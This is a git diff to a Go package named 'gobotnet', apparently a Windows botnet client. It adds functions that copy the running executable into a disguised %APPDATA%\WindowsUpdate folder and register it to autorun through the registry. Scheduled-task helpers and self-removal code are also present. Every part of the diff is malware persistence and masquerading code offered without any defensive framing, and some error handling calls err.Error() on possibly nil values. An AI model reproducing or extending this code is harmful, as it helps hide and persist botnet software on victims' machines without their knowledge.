@@ -1,11 +1,8 @@
 package gobotnet
 
 import (
-	"errors"
 	"fmt"
-	"github.com/satori/go.uuid"
 	"golang.org/x/sys/windows/registry"
-	"io"
 	"os"
 )
 
@@ -14,7 +11,6 @@ var (
 	copyProgramDir     string = os.Getenv("APPDATA") + `\WindowsUpdate`
 	copyExecFilePath   string = copyProgramDir + `\` + programName + ".exe"
 	sourceExecFilePath string = os.Args[0]
-	uid                uuid.UUID
 )
 
 func RegTest() {
@@ -29,6 +25,19 @@ func RegTest() {
 
 	// err = CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
 	// fmt.Println(err)
+}
+
+func RegisterProgram() {
+	err := CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
+	OutMessage(err.Error())
+	err = RegisterAutoRun()
+	OutMessage(err.Error())
+}
+
+func UnRegisterProgram() {
+	UnRegisterAutoRun()
+	DeleteFile(sourceExecFilePath)
+	DeleteFile(copyExecFilePath)
 }
 
 func RegisterAutoRun() error {
@@ -55,44 +64,4 @@ func IsRegisterSchedule(nameTask string) ([]byte, error) {
 
 func UnRegisterSchedule(nameTask string) ([]byte, error) {
 	return CmdExec("schtasks /delete /f /tn " + nameTask)
-}
-
-func CopyFileToDirectory(pathSourceFile string, pathDestFile string) error {
-	sourceFile, err := os.Open(pathSourceFile)
-	if err != nil {
-		return err
-	}
-	defer sourceFile.Close()
-
-	destFile, err := os.Create(pathDestFile)
-	if err != nil {
-		return err
-	}
-	defer destFile.Close()
-
-	_, err = io.Copy(destFile, sourceFile)
-	if err != nil {
-		return err
-	}
-
-	err = destFile.Sync()
-	if err != nil {
-		return err
-	}
-
-	sourceFileInfo, err := sourceFile.Stat()
-	if err != nil {
-		return err
-	}
-
-	destFileInfo, err := destFile.Stat()
-	if err != nil {
-		return err
-	}
-
-	if sourceFileInfo.Size() == destFileInfo.Size() {
-	} else {
-		return errors.New("Bad copy file")
-	}
-	return nil
 }
